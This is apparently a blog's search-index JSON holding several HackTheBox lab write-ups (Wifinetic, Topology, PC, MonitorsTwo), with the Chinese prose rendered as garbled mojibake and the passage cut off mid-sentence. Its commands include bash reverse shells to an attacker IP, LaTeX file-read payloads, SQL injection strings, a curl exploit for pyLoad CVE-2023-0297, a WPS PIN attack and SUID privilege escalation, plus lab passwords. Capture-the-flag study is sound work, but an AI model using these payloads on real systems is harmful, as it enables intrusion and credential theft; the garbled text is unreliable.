{"meta":{"title":"wa0er","subtitle":"wa0er","description":"Love and Share","author":"wa0er","url":"https://wa0er.github.io","root":"/"},"pages":[{"title":"404","date":"2022-03-05T09:41:59.000Z","updated":"2022-03-06T14:24:31.930Z","comments":true,"path":"404.html","permalink":"https://wa0er.github.io/404.html","excerpt":"","text":""},{"title":"categories","date":"2022-03-04T14:03:51.000Z","updated":"2022-03-05T09:26:43.672Z","comments":true,"path":"categories/index.html","permalink":"https://wa0er.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2022-03-04T14:04:30.000Z","updated":"2022-03-05T09:18:33.720Z","comments":true,"path":"about/index.html","permalink":"https://wa0er.github.io/about/index.html","excerpt":"","text":""},{"title":"contact","date":"2022-03-05T09:18:55.000Z","updated":"2022-03-05T09:19:25.465Z","comments":true,"path":"contact/index.html","permalink":"https://wa0er.github.io/contact/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-03-05T09:19:45.000Z","updated":"2022-03-05T09:20:13.247Z","comments":true,"path":"friends/index.html","permalink":"https://wa0er.github.io/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-03-04T14:03:06.000Z","updated":"2022-03-05T09:17:08.567Z","comments":true,"path":"tags/index.html","permalink":"https://wa0er.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"HTB-Wifinetic","slug":"HTB19-Wifinetic-Easy","date":"2023-09-24T11:00:00.000Z","updated":"2023-09-25T09:16:09.564Z","comments":true,"path":"posts/e48c1386.html","link":"","permalink":"https://wa0er.github.io/posts/e48c1386.html","excerpt":"","text":"HTB-Wifineticä¸€ã€æ€è·¯æ¦‚è¦ä¿¡æ¯æ³„éœ²ã€æ— çº¿ç½‘ç»œç›¸å…³çŸ¥è¯† äºŒã€ä¿¡æ¯æ”¶é›† FTP ftp 10.10.11.247 #ä¼šæç¤ºThis FTP server is anonymous onlyï¼Œæ‰€ä»¥ç™»å½•anonymousç”¨æˆ· promot #å…³é—­äº¤äº’æ¨¡å¼ï¼Œä¸å…³çš„è¯ä¸‹è½½æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šè¯¢é—® mget * #ä¸‹è½½æ‰€æœ‰æ–‡ä»¶ MigrateOpenWrt.txtæœ‰å¦‚ä¸‹å†…å®¹ï¼Œæç¤ºReaverå·¥å…·å¯ä»¥æµ‹è¯•å®‰å…¨é—®é¢˜ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥çŸ¥é“æ˜¯Wifiç¯å¢ƒ ProjectGreatMigration.pdfæœ‰é‚®ç®±å’ŒåŸŸå è§£å‹tarå‹ç¼©åŒ… åœ¨./etc/config/wirelessæ‰¾åˆ°äº†ä¸€ä¸ªç–‘ä¼¼å£ä»¤ VeRyUniUqWiFIPasswrd1! åœ¨./etc/passwdå‘ç°ä¸€ä¸ªéå¸¸è§„ç”¨æˆ· å°è¯•è¿æ¥sshæœåŠ¡ï¼ŒæˆåŠŸè¿æ¥ ssh netadmin@10.10.11.247 ä¸‰ã€ææƒæ— çº¿ç½‘ç»œï¼Œæœ€ä¸»è¦çš„å°±æ˜¯å¼„æ¸…æ¥šæ— çº¿APï¼ˆAccess Pointï¼‰æ˜¯è° æ‰§è¡ŒifconfigæŸ¥çœ‹wlan0å’Œwlan1åˆ†é…äº†IPï¼Œå¸¸è§„APçš„IPä¸€èˆ¬éƒ½æ˜¯192.168.1.1ã€192.168.0.1ï¼Œæš‚ä¸”çŒœæµ‹wlan0æ˜¯AP æŸ¥çœ‹wpa_supplicantæœåŠ¡çŠ¶æ€ï¼Œæœ€åä¸€è¡Œå‘½ä»¤å¯çœ‹å‡ºwlan1æ˜¯wifiå®¢æˆ·ç«¯ï¼Œæ’é™¤æ³•åŸºæœ¬ç¡®å®šwlan0æ˜¯AP wpa_supplicantæ˜¯wifiå®¢æˆ·ç«¯åŠ å¯†è®¤è¯å·¥å…·ï¼Œå’Œiwconfigä¸åŒï¼Œæ”¯æŒWEPã€WPAã€WPA2ç­‰å®Œæ•´çš„åŠ å¯†è®¤è¯ï¼Œè€Œiwconfigåªèƒ½æ”¯æŒWEPè®¤è¯ï¼Œä¸å…¶ç›¸å¯¹åº”çš„APç«¯çš„åŠ å¯†è®¤è¯å·¥å…·ä¸ºhostapd systemctl status wpa_supplicant.service å‘½ä»¤è§£é‡Šï¼š /sbin/wpa_supplicant: è¿™æ˜¯ wpa_supplicant å·¥å…·çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œå®ƒç”¨äºå¤„ç†æ— çº¿ç½‘ç»œè¿æ¥çš„è®¤è¯å’Œåå•†è¿‡ç¨‹ã€‚ -u: ä»¥å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰çš„æ–¹å¼è¿è¡Œã€‚è¿™æ„å‘³ç€ wpa_supplicant å°†åœ¨åå°æŒç»­è¿è¡Œï¼Œè€Œä¸æ˜¯åœ¨ç»ˆç«¯çª—å£ä¸­æ˜¾ç¤ºè¾“å‡ºã€‚ -s: ç”Ÿæˆç³»ç»Ÿæ—¥å¿—ï¼ˆsystem logï¼‰ä¿¡æ¯ï¼Œä»¥ä¾¿è·Ÿè¸ªå…¶æ“ä½œå’Œé—®é¢˜æ’æŸ¥ã€‚ -c /etc/wpa_supplicant.conf: æŒ‡å®š wpa_supplicant ä½¿ç”¨çš„é…ç½®æ–‡ä»¶çš„è·¯å¾„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé…ç½®æ–‡ä»¶ä½äº /etc/wpa_supplicant.confï¼Œè¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„ä½ç½®ï¼Œç”¨äºå­˜å‚¨æ— çº¿ç½‘ç»œè¿æ¥çš„é…ç½®ä¿¡æ¯ã€‚è¯¥æ–‡ä»¶åŒ…å«äº†ç½‘ç»œçš„SSIDï¼ˆæ— çº¿ç½‘ç»œåç§°ï¼‰å’Œå¯†ç ç­‰ä¿¡æ¯ã€‚ -i wlan1: æŒ‡å®šè¦ç”¨äºæ— çº¿è¿æ¥çš„ç½‘ç»œæ¥å£çš„åç§°ã€‚æ­¤å¤„ç½‘ç»œæ¥å£çš„åç§°æ˜¯ wlan1ï¼Œè¿™é€šå¸¸æ˜¯æ— çº¿ç½‘å¡çš„åç§°ã€‚ æŸ¥çœ‹hostapdæœåŠ¡çŠ¶æ€ systemctl status hostapd.service å‘½ä»¤è§£é‡Šï¼š /usr/sbin/hostapd: è¿™æ˜¯ hostapd å·¥å…·çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œç”¨äºå¯åŠ¨æ— çº¿æ¥å…¥ç‚¹æœåŠ¡ã€‚ -B: ä»¥å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰çš„æ–¹å¼è¿è¡Œï¼Œè€Œä¸åœ¨ç»ˆç«¯çª—å£ä¸­æ˜¾ç¤ºè¾“å‡ºã€‚ -P /run/hostapd.pid: æŒ‡å®š hostapd è¿›ç¨‹çš„ PIDï¼ˆProcess IDï¼‰æ–‡ä»¶çš„ä½ç½®ã€‚PID æ–‡ä»¶ç”¨äºå­˜å‚¨ hostapd è¿›ç¨‹çš„è¿›ç¨‹å·ï¼Œä»¥ä¾¿åç»­ç®¡ç†å’Œç›‘æ§ã€‚ /etc/hostapd/hostapd.conf: æŒ‡å®š hostapd ä½¿ç”¨çš„é…ç½®æ–‡ä»¶çš„è·¯å¾„ã€‚è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†æ— çº¿æ¥å…¥ç‚¹çš„é…ç½®ä¿¡æ¯ï¼Œå¦‚æ— çº¿ç½‘ç»œçš„åç§°ï¼ˆSSIDï¼‰ã€åŠ å¯†æ–¹å¼ã€å¯†ç ç­‰ã€‚ ç”¨iwconfigå‘½ä»¤æŸ¥çœ‹æ— çº¿ç½‘å¡é…ç½®ä¿¡æ¯ iwconfig å‘½ä»¤ç±»ä¼¼äºifconfigå‘½ä»¤ï¼Œä½†æ˜¯å®ƒé…ç½®å¯¹è±¡æ˜¯æ— çº¿ç½‘å¡ï¼Œå®ƒå¯¹ç½‘ç»œè®¾å¤‡è¿›è¡Œæ— çº¿æ“ä½œï¼Œå¦‚è®¾ç½®æ— çº¿é€šä¿¡é¢‘æ®µç­‰ã€‚ å¯ä»¥çœ‹åˆ°ï¼š mon0ç½‘å¡æ¨¡å¼æ˜¯Monitorï¼Œè¯´æ˜æ˜¯ç›‘æ§æ— çº¿ç½‘ç»œçŠ¶æ€çš„æ¥å£ï¼Œä¸€èˆ¬ç”¨äºè°ƒè¯•æˆ–è€…ç›‘æ§ã€‚ wlan1ç½‘å¡æ¨¡å¼æ˜¯Managedï¼Œè¯´æ˜æ˜¯è¢«ç®¡ç†å¯¹è±¡ï¼ˆå³å®¢æˆ·ç«¯ï¼‰ï¼Œè¿æ¥çš„APçš„ESSIDæ˜¯OpenWrtï¼Œè¿˜å¯çœ‹åˆ°APçš„BSSIDï¼ˆMACåœ°å€ï¼‰ã€‚ wlan0ç½‘å¡æ¨¡å¼æ˜¯Masterï¼Œè¯´æ˜æ˜¯ç®¡ç†è€…ï¼ˆå³APï¼‰ã€‚ SSIDå°±æ˜¯æ‰‹æœºä¸Šæœç´¢åˆ°çš„wifiåå­—ï¼ˆæœ¬è´¨æ˜¯ä¸€ä¸²å­—ç¬¦ï¼‰ã€‚ BSSIDå°±æ˜¯æ— çº¿è·¯ç”±å™¨çš„MACåœ°å€ï¼ˆæœ¬è´¨æ˜¯ä¸€ä¸ªMACåœ°å€ï¼‰ã€‚ä¸¾ä¾‹ï¼Œä¸€å®¶å…¬å¸é¢ç§¯æ¯”è¾ƒå¤§ï¼Œå®‰è£…äº†è‹¥å¹²å°æ— çº¿æ¥å…¥ç‚¹ï¼ˆAPæˆ–è€…æ— çº¿è·¯ç”±å™¨ï¼‰ï¼Œæ¯å°è®¾å¤‡çš„SSIDéƒ½ä¸€æ ·ï¼Œå‘˜å·¥åªéœ€è¦çŸ¥é“ä¸€ä¸ªSSIDå°±å¯ä»¥åœ¨æ— çº¿èŒƒå›´å†…æ¥å…¥æ— çº¿ç½‘ç»œã€‚BSSIDå…¶å®å°±æ˜¯æ¯å°è®¾å¤‡çš„MACåœ°å€ã€‚ ESSIDæ˜¯ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µã€‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¤šå°è®¾å¤‡ç›¸åŒçš„SSIDå°±ç»Ÿç§°ä¸ºESSIDã€‚ ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹æ¯ä¸ªæ¥å£çš„é“¾è·¯çŠ¶æ€ä¿¡æ¯ iw dev å¯çœ‹åˆ°wlan0çš„åœ°å€å’Œssidå’Œä¸Šé¢åˆ†æçš„å®Œå…¨å¯¹åº”ï¼Œtypeå€¼ä¹Ÿæ˜¯AP ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ç¨‹åºæ–‡ä»¶çš„capabilitieså±æ€§ getcap -r / 2&gt;/dev/null getcapå‘½ä»¤å’ŒLinux capabilitiesï¼šhttps://www.cnblogs.com/sparkdev/p/11417781.html ç”¨washå·¥å…·æ‰«æwlan1å’Œwlan2ï¼Œçœ‹æ˜¯å¦å¯ç”¨äº†WPSè®¤è¯ï¼Œå‘ç°éƒ½æ²¡æœ‰ç»“æœ wash -i wlan2 ç”¨reaverå·¥å…·ç ´è§£ç½‘ç»œWPS PIN reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1 -i mon0: æŒ‡å®šè¦ç”¨äºæ— çº¿ç›‘æ§çš„ç½‘ç»œæ¥å£çš„åç§°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŒ‡å®šçš„æ¥å£æ˜¯ mon0ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªç”¨äºç›‘å¬æ— çº¿ç½‘ç»œæµé‡çš„ç›‘è§†æ¨¡å¼æ¥å£ã€‚mon0 æ¥å£é€šå¸¸æ˜¯é€šè¿‡ airmon-ng ç­‰å·¥å…·åˆ›å»ºçš„ã€‚ -b 02:00:00:00:00:00: æŒ‡å®šç›®æ ‡æ— çº¿ç½‘ç»œçš„BSSIDï¼ˆåŸºæœ¬æœåŠ¡é›†æ ‡è¯†ç¬¦ï¼‰ã€‚ -vv: å¢åŠ å‘½ä»¤çš„è¯¦ç»†åº¦ï¼Œä½¿å…¶è¾“å‡ºæ›´å¤šçš„è°ƒè¯•ä¿¡æ¯ã€‚-v è¡¨ç¤ºâ€œè¯¦ç»†æ¨¡å¼â€ï¼ˆverbose modeï¼‰ï¼Œä½¿ç”¨ä¸¤ä¸ª -v è¡¨ç¤ºæ›´è¯¦ç»†çš„è¾“å‡ºã€‚ -c 1: æŒ‡å®šç›®æ ‡æ— çº¿ç½‘ç»œçš„ä¿¡é“å·ã€‚æ­¤å¤„ä¿¡é“å·æ˜¯ 1ï¼Œè¡¨ç¤º reaver å°†å°è¯•ç ´è§£ä¸è¯¥ä¿¡é“å…³è”çš„ç›®æ ‡ç½‘ç»œçš„WPS PINã€‚ æˆåŠŸè·å–WPA PSKï¼Œå°è¯•ä»¥rootèº«ä»½ç™»å½•ï¼ŒæˆåŠŸè·å–rootæƒé™ WhatIsRealAnDWhAtIsNot51121! Overï¼","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Topology","slug":"HTB18-Topology-Easy","date":"2023-09-23T11:00:00.000Z","updated":"2023-09-25T05:21:07.666Z","comments":true,"path":"posts/e1e0c79d.html","link":"","permalink":"https://wa0er.github.io/posts/e1e0c79d.html","excerpt":"","text":"HTB-Topologyä¸€ã€æ€è·¯æ¦‚è¦1.ä¿¡æ¯æ”¶é›†å‘ç°LaTeXå…¬å¼ç”Ÿæˆå™¨ï¼› 2.LaTeXå…¬å¼ç”Ÿæˆå™¨ä»»æ„æ–‡ä»¶è¯»å–Apacheçš„.htpasswdæ–‡ä»¶è·å–SSHè´¦æˆ·ï¼› 3.SSHè¿æ¥æ‰§è¡Œpspy64å‘ç°å®šæ—¶ä»»åŠ¡åå¼¹shellè·å–rootæƒé™ã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«æç«¯å£æœåŠ¡ nmap -A 10.10.11.217 80ç«¯å£å¼€æ”¾ï¼Œç›´æ¥è®¿é—® é¦–é¡µçœ‹åˆ°æœ‰ä¸€ä¸ªLaTeXè¡¨è¾¾å¼çš„è¶…é“¾æ¥ å‘ç°å­åŸŸï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.217 latex.topology.htb topology.htb\" &gt;&gt; /etc/hosts ä¸‰ã€latexå®ç°ä»»æ„æ–‡ä»¶è¯»å–googleå…³é”®è¯ï¼šlatex exploit https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection ç»è¿‡å°è¯•ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼Œè¯»å–/etc/passwdæ–‡ä»¶ $\\lstinputlisting{/etc/passwd}$ å‘ç°å¦ä¸€ä¸ªç”¨æˆ·vdaisleyï¼Œä½†æ˜¯æ²¡æœ‰å£ä»¤ï¼Œæ‰«æå­åŸŸå‘ç°statså’Œdevå­åŸŸï¼Œéƒ½æ·»åŠ åˆ°æœ¬åœ°hostsæ–‡ä»¶åï¼Œstatså­åŸŸæ‰“å¼€æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œdevå­åŸŸéœ€è¦è®¤è¯ gobuster vhost -u http://topology.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 æ—¢ç„¶devå­åŸŸéœ€è¦è®¤è¯ï¼Œè€Œä¸”é€šå¸¸åœ¨ApacheæœåŠ¡å™¨ä¸­ä¼šä½¿ç”¨.htpasswdæ–‡ä»¶å­˜å‚¨å¯†ç æ–‡ä»¶ï¼Œé‚£ä¹ˆvdaisleyçš„å£ä»¤ä¹Ÿææœ‰å¯èƒ½å­˜å‚¨åœ¨devå­åŸŸçš„.htpasswdæ–‡ä»¶ä¸­ï¼Œåˆå› ä¸ºæ­¤æ–‡ä»¶é€šå¸¸ä½äºç½‘ç«™æ ¹ç›®å½•ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å¦‚ä¸‹payloadå°è¯•è¯»å–/var/www/dev/.htpasswdæ–‡ä»¶ $\\lstinputlisting{/var/www/dev/.htpasswd}$ vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0 æŠŠhashå€¼å†™å…¥æ–‡ä»¶hashï¼Œç”¨johnçˆ†ç ´ john --wordlist=/usr/share/wordlists/rockyou.txt hash vdaisley:calculus20 SSHè¿æ¥ å››ã€pspy64å‘ç°å®šæ—¶ä»»åŠ¡åå¼¹shellæœ¬åœ°kaliå¼€å¯httpæœåŠ¡ python3 -m http.server 80 ç›®æ ‡é¶æœºä»æœ¬åœ°ä¸‹è½½pspy64 wget http://10.10.14.8/pspy64 chmod +x pspy64 æ‰§è¡Œï¼Œå‘ç°å®šæ—¶ä»»åŠ¡å¦‚ä¸‹ï¼Œå¯é€šè¿‡åœ¨/opt/gnuplotç›®å½•ä¸‹æ–°å»ºåç¼€ä¸º.pltçš„æ–‡ä»¶ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­å†™å…¥æ¶æ„å‘½ä»¤ï¼Œé€šè¿‡å®šæ—¶ä»»åŠ¡çš„/bin/sh -cé—´æ¥æ‰§è¡Œ æ–°å»ºæ–‡ä»¶/opt/gnuplot/shell.pltï¼Œå†…å®¹å¦‚ä¸‹ system \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/9898 0&gt;&amp;1'\" æœ¬åœ°kaliå¼€å¯ç›‘å¬ nc -lvnp 9898 ç¨ç­‰ç‰‡åˆ»ï¼ŒæˆåŠŸè·å–rootæƒé™ Overï¼","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-PC","slug":"HTB17-PC-Easy","date":"2023-09-16T11:00:00.000Z","updated":"2023-09-25T05:21:07.666Z","comments":true,"path":"posts/cbbc48d2.html","link":"","permalink":"https://wa0er.github.io/posts/cbbc48d2.html","excerpt":"","text":"HTB-PCä¸€ã€æ€è·¯æ¦‚è¦1.ç«¯å£æ‰«æå‘ç°gRPCæœåŠ¡ï¼› 2.gRPCå­˜åœ¨SQLæ³¨å…¥è·å–åˆ°SSHè´¦æˆ·ï¼› 3.SSHè¿æ¥æŸ¥çœ‹ä¸»æœºç«¯å£æœåŠ¡å‘ç°pyLoadæœåŠ¡ï¼› 4.pyLoadæœåŠ¡å­˜åœ¨RCEï¼ˆCVE-2023-0297ï¼‰åå¼¹shellè·å–rootæƒé™ã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«æç«¯å£æœåŠ¡ nmap -p- --min-rate 10000 -Pn -sT 10.10.11.214 éå¸¸è§„ç«¯å£50051ï¼Œç›´æ¥æµè§ˆå™¨è®¿é—®æ˜¯ä¹±ç ï¼Œgoogleå‘ç°æ˜¯gRPCé»˜è®¤ç«¯å£ googleå…³é”®å­—ï¼šgRPC exploit https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9 æ–‡ç« å¤§è‡´æ„æ€æ˜¯ï¼Œæœ‰ä¸€ä¸ªSQLæ³¨å…¥ å·¥å…·ï¼š grpcurlï¼šhttps://github.com/fullstorydev/grpcurl grpcuiï¼šhttps://github.com/fullstorydev/grpcui ç”¨grpcurlå¯ä»¥æŸ¥çœ‹ä¸€äº›åŸºæœ¬æœåŠ¡ï¼ŒSimpleAppå¯¹åº”æœ‰LoginUserã€RegisterUserã€getInfoä¸‰ä¸ªæ¥å£æ–¹æ³• ç”¨grpcuiå·¥å…·ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå®ç°ä¸gRPCæœåŠ¡äº¤äº’ ./grpcui -plaintext 10.10.11.214:50051 è‡ªåŠ¨æ‰“å¼€å¦‚ä¸‹webé¡µé¢ï¼Œç„¶åæ‰“å¼€Burpsuiteï¼Œæ•è·ä¸‹é¢çš„æ“ä½œè¿‡ç¨‹ï¼Œæ–¹ä¾¿æµ‹è¯•SQLæ³¨å…¥ åœ¨LoginUseræ¥å£ï¼Œå¼±å£ä»¤admin:adminæˆåŠŸè®¤è¯ï¼ˆä¸‹é¢çš„è®¤è¯è·¯å¾„æ˜¯é€šè¿‡è§‚å¯Ÿå“åº”çš„messageï¼Œå°è¯•å‡ºæ¥çš„æ­£ç¡®è®¤è¯è¿‡ç¨‹ï¼‰ å¾—åˆ°ä¸€ä¸ªidå’Œtoken 525 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTQ0MDgzMjB9.SH7DanchqAh3QMbI2q8VTH9X1qKX438MtNA8Ixr9TNU ç„¶ååˆ°getInfoæ¥å£ï¼ŒRequest Metadataå¡«å…¥å¯¹åº”çš„tokené”®å€¼å¯¹ï¼ŒRequest Dataå¡«å…¥idå€¼ ç‚¹å‡»Invokeä¹‹åï¼Œå“åº”ä¹Ÿæ˜¯æˆåŠŸçš„å“åº” ä¸‰ã€gRPC SQLæ³¨å…¥åœ¨æœ€ågetInfoçš„æ•°æ®åŒ…ä¸­ï¼Œidéƒ¨åˆ†å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œå› ä¸ºåŠ å•å¼•å·ä¼šæœ‰æŠ¥é”™æç¤º æŠŠè¯·æ±‚åŒ…ä¿å­˜ä¸ºsqltestæ–‡ä»¶ï¼Œsqlmapæ³¨å…¥ï¼Œç¬”è€…æ­¤å¤„sqlmapè·‘ä¸å‡ºï¼Œæ‰‹å·¥å¯ä»¥æ³¨å‡ºæ•°æ® sqlmap -r sqltest -p id -f --batch --dump-all æ‰‹å·¥ï¼ˆæ³¨æ„unionå‰idæ”¹ä¸ºä¸€ä¸ªé”™è¯¯idï¼‰ï¼š \"id\":\"520 union select sqlite_version(); --+\" #è¡¨åï¼Œæ•°æ®åº“å \"id\":\"520 union select group_concat(sql) from sqlite_master --+\" #usernameçš„å€¼ \"id\":\"520 union select group_concat(username) from accounts --+\" #password \"id\":\"520 union select group_concat(password) from accounts --+\" æ–°æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ· sau : HereIsYourPassWord1431 SSHè¿æ¥ netstat -antpæŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µï¼Œæœ‰9666ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œä½†è®¿é—®ä¸åˆ°ï¼Œé‚£å°±å°è¯•æŠŠå¯¹å†…å¼€æ”¾çš„8000ç«¯å£åšç«¯å£è½¬å‘ ä»æœ¬åœ°ä¸‹è½½chisel æœ¬åœ°kaliæ‰§è¡Œ python3 -m http.server 80 ç›®æ ‡é¶æœºæ‰§è¡Œ wget http://10.10.14.8/chisel chmod +x chisel å»ºç«‹ç«¯å£è½¬å‘ æœ¬åœ°kaliæ‰§è¡Œ ./chisel server --port 9898 --reverse ç›®æ ‡é¶æœºæ‰§è¡Œ ./chisel client -v 10.10.14.8:9898 R:8000:127.0.0.1:8000 æœ¬åœ°æµè§ˆå™¨è®¿é—®127.0.0.1:8000 å››ã€pyLoad RCEï¼ˆCVE-2023-0297ï¼‰googleå…³é”®è¯ï¼špyload exploit https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad åœ¨ç›®æ ‡é¶æœº/tmpç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªshell.shï¼Œå†™å…¥å¦‚ä¸‹åå¼¹shellè„šæœ¬ bash -i &gt;&amp; /dev/tcp/10.10.14.8/9899 0&gt;&amp;1 æœ¬åœ°kaliå¼€å¯ç›‘å¬nc -lvnp 9899 é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ curl -i -s -k -X $'POST' \\ --data-binary $'jk=pyimport%20os;os.system(\\\"bash%20/tmp/shell.sh\\\");f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \\ $'http://127.0.0.1:8000/flash/addcrypted2' æˆåŠŸè·å–rootæƒé™ Overï¼","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-MonitorsTwo","slug":"HTB16-MonitorsTwo-Easy","date":"2023-09-09T11:00:00.000Z","updated":"2023-09-25T05:21:07.665Z","comments":true,"path":"posts/1ca70420.html","link":"","permalink":"https://wa0er.github.io/posts/1ca70420.html","excerpt":"","text":"HTB-MonitorsTwoä¸€ã€æ€è·¯æ¦‚è¦1.ä¿¡æ¯æ”¶é›†å‘ç°Cactiæ¡†æ¶å­˜åœ¨CVE-2022-46169å‘½ä»¤æ³¨å…¥æ¼æ´ï¼› 2.CVE-2022-46169å‘½ä»¤æ³¨å…¥è·å–www-dataæƒé™ï¼› 3.å‘ç°mysqlæ•°æ®åº“å’Œå¸¦suidçš„æ–‡ä»¶capshï¼› 4.capshææƒåˆ°rootï¼ˆæ­¤rootéå½¼rootï¼‰ï¼› 5.æ•°æ®åº“æŸ¥è¯¢å‘ç°sshç”¨æˆ·ï¼› 6.sshç”¨æˆ·è¿æ¥ä¸Šå»ï¼Œå‘ç°é‚®ä»¶ï¼Œå­˜åœ¨dockeræ¼æ´CVE-2021-41091ï¼› 7.dockeræ¼æ´ææƒåˆ°rootã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«æç«¯å£æœåŠ¡ 80ç«¯å£å¼€æ”¾ï¼Œé‚£ä¹ˆè®¿é—®webç«¯ ä¸‰ã€CVE-2022-46169ï¼ˆCactiå‘½ä»¤æ³¨å…¥æ¼æ´ï¼‰googleå…³é”®å­—Cacti exploit æ‰¾åˆ°æ˜¯CVE-2022-46169 exploitï¼šhttps://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22 æœ¬åœ°å¼€å¯ç›‘å¬ï¼Œå¹¶æ‰§è¡Œexp nc -lvnp 9898 python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.4 --LPORT=9898 è·å–www-dataæƒé™ åœ¨/var/www/html/ä¸‹å‘ç°æ•°æ®åº“æ–‡ä»¶cacti.sqlï¼Œçœ‹åˆ°æœ‰adminç”¨æˆ·å¯†ç ï¼Œä½†å®é™…æ— æ³•ç™»å½•ä¸»é¡µ æ ¹ç›®å½•æœ‰entrypoint.shï¼Œå¯çœ‹åˆ°æ˜¯mysqlæ•°æ®åº“ï¼Œæœ‰ä¸€äº›æ•°æ®åº“å‘½ä»¤ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥æ‰¾æœ‰suidæƒé™çš„æ–‡ä»¶ï¼Œçœ‹åˆ°/sbin/capshï¼Œæ¯”è¾ƒç½•è§ find / -perm -u=s -type f 2&gt;/dev/null åœ¨shellå‘½ä»¤ææƒæ‰‹å†Œé‡Œæ‰¾åˆ°ææƒç”¨æ³•å¦‚ä¸‹ https://gtfobins.github.io/gtfobins/capsh/#suid /sbin/capsh --gid=0 --uid=0 -- ææƒåˆ°äº†rootï¼Œä½†æ˜¯æ­¤rootéå½¼root çœ‹åˆ°ä¸Šé¢æœ‰mysqlå‘½ä»¤ï¼Œè€Œä¸”adminå’Œguestç”¨æˆ·éƒ½åœ¨user_authè¡¨é‡Œï¼Œé‚£ä¹ˆæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ mysql --host=db --user=root --password=root cacti -e \"SELECT * FROM user_auth\" å‘ç°æœ‰å¦ä¸€ä¸ªç”¨æˆ·marcusï¼Œå¯†ç æ˜¯hashå­˜å‚¨ï¼Œé‚£å°±ç”¨johnçˆ†ç ´ä¸€ä¸‹ å°†hashä¿å­˜åˆ°æ–°æ–‡ä»¶hashé‡Œï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¾—åˆ°å¯†ç  john --wordlist=/usr/share/wordlists/rockyou.txt hash marcus:funkymonkey sshè¿æ¥ ä»æœ¬åœ°ä¸‹è½½linpeas æœ¬åœ°kaliæ‰§è¡Œ python3 -m http.server 80 ç›®æ ‡é¶æœºæ‰§è¡Œ cd /tmp wget http://10.10.14.4/linpeas.sh chmod +x linpeas.sh ./linpeas.sh å‘ç°æœ‰é‚®ä»¶ æŸ¥çœ‹é‚®ä»¶ cat /var/mail/marcus å››ã€CVE-2021-41091ï¼ˆdockerç›®å½•éå†&amp;å‘½ä»¤æ‰§è¡Œï¼‰å¯çœ‹åˆ°æœ‰ä¸‰ä¸ªCVEï¼Œä¾æ¬¡googleæŸ¥æ‰¾åˆ©ç”¨æ–¹å¼ï¼Œæ‰¾åˆ°å¦‚ä¸‹exploitï¼Œæ˜¯dockerå®¹å™¨çš„æ¼æ´ https://github.com/UncleJ4ck/CVE-2021-41091 å¤§è‡´åŸç†æ˜¯ï¼Œå› 